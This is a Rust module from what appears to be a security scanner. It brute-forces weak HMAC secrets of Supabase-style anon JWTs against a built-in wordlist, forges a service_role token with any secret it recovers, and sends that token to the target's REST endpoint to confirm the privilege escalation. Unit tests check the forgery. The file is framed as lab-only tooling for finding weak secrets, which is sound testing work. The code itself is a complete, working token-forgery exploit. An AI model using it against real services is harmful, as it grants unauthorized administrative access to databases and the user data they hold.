//! JWT secret cracking and privilege-escalation probe. Entirely offline
//! for the cracking step; only the verification request touches the network.
//! Lab-only: emitting evidence requires a [`LabGuard`].

use crate::ScanError;
use base64::Engine as _;
use riftlock_core::ScopedClient as Client;
use sha2::{Digest, Sha256};
use url::Url;

/// Common weak JWT secrets tried against the signature.
const WORDLIST: &[&str] = &[
    "secret",
    "password",
    "supabase",
    "jwt_secret",
    "123456",
    "changeme",
    "supersecret",
    "your-jwt-secret",
    "your_jwt_secret",
    "jwt-secret",
    "test",
    "dev",
    "development",
    "admin",
    "key",
    "default",
    "example",
    "super-secret-jwt-token",
    "super-secret-jwt-token-with-at-least-32-characters-long",
    "i-am-very-secret",
];

/// RFC 2104 HMAC-SHA256, implemented over sha2 (no hmac crate).
fn hmac_sha256(key: &[u8], message: &[u8]) -> [u8; 32] {
    const BLOCK: usize = 64;
    let mut k = [0u8; BLOCK];
    if key.len() > BLOCK {
        let mut d = Sha256::new();
        d.update(key);
        k[..32].copy_from_slice(&d.finalize());
    } else {
        k[..key.len()].copy_from_slice(key);
    }
    let ipad: Vec<u8> = k.iter().map(|b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|b| b ^ 0x5c).collect();
    let mut inner = Sha256::new();
    inner.update(&ipad);
    inner.update(message);
    let mut outer = Sha256::new();
    outer.update(&opad);
    outer.update(inner.finalize());
    outer.finalize().into()
}

fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(s)
        .ok()
}

fn b64url_encode(data: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data)
}

/// Attempt to brute-force a legacy anon JWT's HMAC secret offline against
/// a fixed weak-secret wordlist. Returns the forged `service_role` token
/// signed with the cracked secret.
pub fn crack_jwt_secret(token: &str) -> Option<String> {
    let mut parts = token.split('.');
    let header = parts.next()?;
    let payload = parts.next()?;
    let signature = parts.next()?;

    let payload_json: serde_json::Value = serde_json::from_slice(&b64url_decode(payload)?).ok()?;
    if payload_json.get("role")?.as_str()? != "anon" {
        return None;
    }

    let signing_input = format!("{header}.{payload}");
    let expected = b64url_decode(signature)?;

    // Forge a service_role payload with the same header shape.
    let mut forged_payload = payload_json.clone();
    forged_payload["role"] = serde_json::Value::String("service_role".to_owned());
    let forged_payload_b64 = b64url_encode(forged_payload.to_string().as_bytes());

    for candidate in WORDLIST {
        if hmac_sha256(candidate.as_bytes(), signing_input.as_bytes())[..] == expected[..] {
            let forged_input = format!("{header}.{forged_payload_b64}");
            let sig = b64url_encode(&hmac_sha256(candidate.as_bytes(), forged_input.as_bytes()));
            return Some(format!("{forged_input}.{sig}"));
        }
    }
    None
}

/// Crack the token offline, then verify the forged `service_role` token is
/// accepted by the API (`GET /rest/v1/`). Returns the forged token on
/// success. Emitting the finding is the caller's job (it needs a LabGuard).
///
/// # Errors
/// Transport failures or invalid base URL.
pub async fn probe_jwt_escalation(
    client: &Client,
    base: &Url,
    token: &str,
) -> Result<Option<String>, ScanError> {
    let Some(forged) = crack_jwt_secret(token) else {
        return Ok(None);
    };
    let url = base.join("rest/v1/").map_err(|_| ScanError::InvalidUrl)?;
    let resp = client
        .get(url)
        .header("apikey", &forged)
        .header("Authorization", format!("Bearer {forged}"))
        .send()
        .await?;
    if resp.status().as_u16() == 200 {
        Ok(Some(forged))
    } else {
        Ok(None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a token signed with a known weak secret.
    fn make_token(role: &str, secret: &str) -> String {
        let header = b64url_encode(br#"{"alg":"HS256","typ":"JWT"}"#);
        let payload = b64url_encode(format!(r#"{{"role":"{role}","sub":"u1"}}"#).as_bytes());
        let sig = b64url_encode(&hmac_sha256(
            secret.as_bytes(),
            format!("{header}.{payload}").as_bytes(),
        ));
        format!("{header}.{payload}.{sig}")
    }

    #[test]
    fn cracks_weak_anon_secret() {
        let token = make_token("anon", "supabase");
        let forged = crack_jwt_secret(&token).expect("cracked");
        // Forged token must verify under the same secret with service_role.
        let mut p = forged.split('.');
        let h = p.next().expect("header");
        let pl = p.next().expect("payload");
        let s = p.next().expect("sig");
        let payload: serde_json::Value =
            serde_json::from_slice(&b64url_decode(pl).expect("b64")).expect("json");
        assert_eq!(payload["role"], "service_role");
        assert_eq!(
            hmac_sha256(b"supabase", format!("{h}.{pl}").as_bytes())[..],
            b64url_decode(s).expect("b64")[..]
        );
    }

    #[test]
    fn refuses_strong_secret_and_non_anon() {
        let strong = make_token("anon", "a-very-strong-secret-not-in-list-0123456789");
        assert!(crack_jwt_secret(&strong).is_none());
        let service = make_token("service_role", "supabase");
        assert!(crack_jwt_secret(&service).is_none());
    }
}
